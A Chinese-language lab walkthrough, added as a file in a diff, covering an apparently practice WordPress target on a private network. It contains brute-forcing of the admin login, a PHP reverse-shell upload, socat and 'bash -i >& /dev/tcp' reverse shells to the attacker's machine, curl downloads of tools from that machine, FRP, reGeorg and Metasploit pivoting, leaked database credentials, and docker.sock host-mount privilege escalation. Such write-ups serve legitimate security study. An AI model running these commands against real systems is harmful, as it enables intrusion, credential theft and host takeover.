@@ -1,0 +1,469 @@
+# mynew
+WPForce
+socat拿稳定shell
+for i in {1..254}; do (ping -c 1 172.18.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
+端口探测脚本：
+FRP代理路： 
+发现docker容器的拉取文件！remote API未授权访问 
+
+# 
+
+
+VMware双击打开nat模式即可！在界面会显示iP信息！
+
+1、nmap 192.168.253.182 -p- -A
+
+22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)
+8000/tcp open  http    Apache httpd 2.4.10 ((Debian))
+|_http-generator: WordPress 4.8.1
+
+nmap扫到了22和8000端口都打开了，可以看到这又是wordpress CMS
+
+
+2、web信息收集
+
+访问：http://192.168.253.182:8000/
+
+wpscan --url http://192.168.253.182:8000/ -eu
+存在：bob用户
+
+dirb http://192.168.253.182:8000/
+
+登录界面：
+http://192.168.253.182:8000/admin
+
+nikto发现：
+/wp-admin/admin-ajax.php
+
+
+3、暴力破解
+
+WPForce爆破：
+
+https://github.com/n00py/WPForce
+proxychains4 git clone https://github.com/n00py/WPForce.git
+
+密码字典合集：
+https://github.com/danielmiessler/SecLists
+
+python wpforce.py -i user.txt -w 10-million-password-list-top-10000.txt -u http://192.168.253.182:8000/
+
+---------
+Now the brute force will begin!  >:)
+
+--------------------------
+[bob : Welcome1] are valid credentials!  - THIS ACCOUNT IS ADMIN
+
+--------------------------
+ 100% Percent Complete
+All correct pairs:
+{'bob': 'Welcome1'}
+
+---------
+这还是有百分比动态变动的，比较舒适美观！
+或者用wpscan、bp也可以！
+
+
+4、文件上传-getshell
+
+http://192.168.253.182:8000/admin
+
+bob
+Welcome1
+
+文件上传已经很简单了，快速上传吧！
+
+上传php-reverse-shell.php，获得反弹shell后，wget没安装！
+
+
+发现没安装python，回顾项目十一socat拿稳定shell：
+------------------------
+2）pty方法
+安装了curl：
+curl -O http://192.168.253.138:8082/socat
+chmod +x socat
+
+nc -vlp 9998
+HOME=/dev/shm ./socat tcp:192.168.139.131:9998 exec:'/bin/bash -li',pty,stderr,sigint,sighup,sigquit,sane
+
+使用script：
+script -qc bash /dev/null
+
+stty raw -echo
+fg
+------------------------
+
+5、内部文件信息收集
+curl用法参考：
+https://www.cnblogs.com/hujiapeng/p/8470099.html
+
+上传linpeas.sh：
+
+curl -# -O http://192.168.253.138:8082/linpeas.sh
+
+1）Linux version 3.13.0-128-generic
+2）多个网卡信息：
+172.18.0.1 dev eth0 lladdr 02:42:78:42:eb:c8 REACHABLE
+172.18.0.4 dev eth0 lladdr 02:42:ac:12:00:04 REACHABLE
+IP address       HW type     Flags       HW address            Mask     Device
+172.18.0.1       0x1         0x2         02:42:78:42:eb:c8     *        eth0
+172.18.0.4       0x1         0x2         02:42:ac:12:00:04     *        eth0
+
+3）mysql信息泄露：
+/var/www/html/wp-config.php
+define('DB_NAME', 'wordpress');
+define('DB_USER', 'wordpress');
+define('DB_PASSWORD', 'WordPressISBest');
+define('DB_HOST', 'db:3306');
+define( 'WP_SITEURL', 'http://' . $_SERVER['HTTP_HOST'] );
+define( 'WP_HOME', 'http://' . $_SERVER['HTTP_HOST'] );
+
+4）Current: = cap_chown
+
+
+该环境装了docker，测试下网络：
+ping 172.18.0.1
+ping 172.18.0.2
+ping 172.18.0.3
+ping 172.18.0.4
+
+for i in {1..254}; do (ping -c 1 172.18.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
+
+64 bytes from 172.18.0.1: icmp_seq=0 ttl=64 time=0.044 ms
+64 bytes from 172.18.0.2: icmp_seq=0 ttl=64 time=0.031 ms
+64 bytes from 172.18.0.3: icmp_seq=0 ttl=64 time=0.082 ms
+64 bytes from 172.18.0.4: icmp_seq=0 ttl=64 time=0.057 ms
+
+ss -ntp
+State      Recv-Q Send-Q        Local Address:Port          Peer Address:Port 
+ESTAB      0      0                172.18.0.2:53838      192.168.253.138:1234  
+ESTAB      136    0                172.18.0.2:80         192.168.253.138:54386 
+ESTAB      0      0                172.18.0.2:80         192.168.253.138:53968 
+ESTAB      0      2                172.18.0.2:55121      192.168.253.138:9998
+
+或者：ip r     ip a
+
+端口探测脚本：
+------
+```
+#!/bin/bash
+hosts=(
+"172.18.0.1"
+"172.18.0.2"
+"172.18.0.3"
+"172.18.0.4"
+)
+END=65535
+for host in "${hosts[@]}"
+do
+	   echo "==============================="
+	   echo "Scanning $host"
+	   echo "==============================="
+	       for ((port=1;port<=END;port++))
+	       do
+	       echo "" > /dev/tcp/$host/$port && echo "Port $port is open"
+	done 2>/dev/null
+done
+```
+
+------   
+curl -# -O http://192.168.253.138:8082/bash.sh
+chmod +x bash.sh
+
+===============================
+Scanning 172.18.0.1
+
+===============================
+Port 22 is open
+Port 8000 is open
+
+===============================
+Scanning 172.18.0.2
+
+===============================
+Port 80 is open
+
+===============================
+Scanning 172.18.0.3
+
+===============================
+Port 22 is open
+Port 8022 is open
+
+===============================
+Scanning 172.18.0.4
+
+===============================
+Port 3306 is open
+
+发现了8022端口在.3上：
+curl -s 172.18.0.3:8022
+
+<title>Docker-SSH</title>
+
+
+
+==============================================================
+FRP代理路：
+
+1、下载frp
+
+[common]
+bind_addr = 0.0.0.0
+bind_port = 7000
+
+
+# frpc.ini
+[common]
+server_addr = 192.168.253.138
+server_port = 7000
+[http_proxy]
+type = tcp
+remote_port = 7777
+plugin = socks5
+
+
+curl -O http://192.168.253.138:8082/frpc
+curl -# -O http://192.168.253.138:8082/frpc.ini
+chmod +x frpc
+./frps -c frps.ini  ---执行服务端
+./frpc -c frpc.ini
+
+
+搭建成功后，gedit /etc/proxychains4.conf
+最后一行加上：socks5 192.168.253.138 7777
+
+proxychains nmap -sT -sV -Pn -n -p8022 172.18.0.3
+8022/tcp open  http    Node.js Express framework
+
+可看到这是Node.js的站，开放了8022端口！
+
+
+火狐浏览器：FoxyProxy 加入：socks5代理并选择访问：
+http://172.18.0.3:8022/
+可以执行命令，反弹到本地：
+
+nc -vlp 9988
+bash -i >& /dev/tcp/192.168.253.138/9988 0>&1
+
+
+启动容器：
+
+cd run
+srw-rw----  1 root  mysql    0 Mar 26  2022 docker.sock
+drwxrwxrwt  2 root  root  4096 Jul 23  2017 lock
+drwxrwxrwx  2 mysql mysql 4096 Mar 26  2022 mysqld
+-rw-rw-r--  1 root  utmp     0 Jul 23  2017 utmp
+
+发现docker容器的拉取文件！remote API未授权访问
+
+参考：
+
+apt-get update
+apt-get install curl
+curl -fsSL get.docker.com -o get-docker.sh
+sh get-docker.sh
+
+docker ps   ---会看到三个客户端
+docker run -it --rm -v /:/vol wordpress /bin/bash
+网络太卡了！！！
+
+
+直接在kali本地运行：
+docker run -it --rm -v /:/vol wordpress /bin/bash
+
+
+或者：
+docker run -it --rm -v /:/vol wordpress /bin/bash
+参考链接：https://fosterelli.co/privilege-escalation-via-docker.html
+
+docker run -v /:/host -t -i bash
+
+==============================================================
+
+MSF进行渗透！！！！
+
+use exploit/multi/handler
+set payload php/reverse_php
+set lhost 192.168.253.138
+set LPORT 1234
+exploit -j
+
+获得稳定shell，但是在容器中！
+
+use post/multi/manage/shell_to_meterpreter
+set session 1
+run
+
+这时候就能拿到一个非常稳定的shell了！存在MSF的窗口！
+ifconfig等命令都可以用了！
+
+ifconfig：
+IPv4 Address : 172.18.0.2
+
+
+加路由表：
+参考：
+https://pingmaoer.github.io/2020/05/09/利用msf自带的route模块穿透目标内网/
+
+1）方法1：
+run autoroute -s 172.18.0.0/24
+[+] Added route to 172.18.0.0/255.255.255.0 via 192.168.253.182
+
+run autoroute -p
+172.18.0.0         255.255.255.0      Session 3
+
+
+2）方法2：
+use post/multi/manage/autoroute
+set SUBNET 172.18.0.0
+set session 3
+exploit
+
+
+172.18.0段做端口扫描：
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 172.18.0.0/24
+set session 3
+exploit
+
+扫描结果：
+[+] 172.18.0.1:           - 172.18.0.1:22 - TCP OPEN
+[+] 172.18.0.1:           - 172.18.0.1:8000 - TCP OPEN
+[+] 172.18.0.2:           - 172.18.0.2:80 - TCP OPEN
+[+] 172.18.0.3:           - 172.18.0.3:22 - TCP OPEN
+[+] 172.18.0.3:           - 172.18.0.3:8022 - TCP OPEN
+[+] 172.18.0.4:           - 172.18.0.4:3306 - TCP OPEN
+
+
+开启socks4a proxy代理：
+use auxiliary/server/socks_proxy
+set SRVPORT 1090
+set session 2
+
+
+或者：
+use post/multi/manage/shell_to_meterpreter   ---不需要设置，默认1080端口
+
+
+gedit /etc/proxychains4.conf
+socks4 127.0.0.1 1090
+
+测试：
+proxychains ssh 172.18.0.4
+
+
+==============================================================
+方法3：reGeorg代理之路！
+
+proxychains curl -o tunnel.php https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.nosocket.php
+
+curl -# -O http://192.168.253.138:8082/tunnel.php
+cp /tmp/tunnel.php .
+访问：http://192.168.253.182:8000/tunnel.php
+回显：Georg says, 'All seems fine'  ---正常
+
+python reGeorgSocksProxy.py -u http://192.168.253.182:8000/tunnel.php
+
+proxychains mysql -u wordpress -pWordPressISBest -h 172.18.0.4
+
+
+
+
+
+这个容器docker.sock允许与 docker 通信，意味着创建、添加、删除容器，因此有一个技巧可以通过上传docker和运行命令docker run -it -v /:/host/ <container_name> chroot /host/ bash二进制文件将主机系统挂载到 docker 容器上，而不是我们有 docker 端口，我们可以访问这些容器，这样我们就可以远程做这个！
+
+如果开启了2375端口：
+docker -H tcp://192.168.253.182:2375 run --rm -it -v /:/host wordpress chroot /host bash
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
